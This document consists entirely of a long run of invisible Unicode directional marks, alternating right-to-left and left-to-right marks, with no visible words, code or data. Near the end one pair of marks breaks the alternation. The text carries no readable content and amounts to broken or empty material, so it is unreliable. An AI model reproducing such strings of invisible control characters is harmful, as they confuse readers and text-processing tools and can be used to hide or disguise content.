‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏